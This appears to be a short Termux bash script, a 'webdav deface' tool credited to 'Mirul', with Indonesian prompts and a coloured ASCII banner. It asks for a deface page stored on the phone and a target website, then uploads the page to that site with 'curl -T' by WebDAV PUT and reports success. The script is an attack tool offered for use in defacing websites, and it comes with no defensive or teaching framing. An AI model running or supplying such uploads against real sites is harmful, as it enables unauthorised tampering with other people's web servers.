#!/bin/bash

#webdav

#warna

blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'

clear
sleep 1
figlet webdav | lolcat
echo "   =============================" | lolcat
echo "
   ╭━━━╮╱╱╱╭━╮
   ╰╮╭╮┃╱╱╱┃╭╯
   ╱┃┃┃┣━━┳╯╰┳━━┳━━┳━━╮
   ╱┃┃┃┃┃━╋╮╭┫╭╮┃╭━┫┃━┫
   ╭╯╰╯┃┃━┫┃┃┃╭╮┃╰━┫┃━┫
   ╰━━━┻━━╯╰╯╰╯╰┻━━┻━━╯
" | lolcat
echo "   ==============================" | lolcat
echo
echo "   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~" | lolcat
echo "   |Code    : Mirul  " | lolcat
echo "   |Script  : Deface " | lolcat
echo "   |Pangkat : Newbie " | lolcat
echo "   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~" | lolcat
echo
echo -e $purple "script deface mesti diluar memori"

read -p "Masukkan script deface : " script

read -p "Web deface : " web

sleep 3
echo -e $green " tunggu... "
sleep 4
termux-setup-storage
curl -T /storage/emulated/0/$script $web
echo -e $green "Succes" $web $script
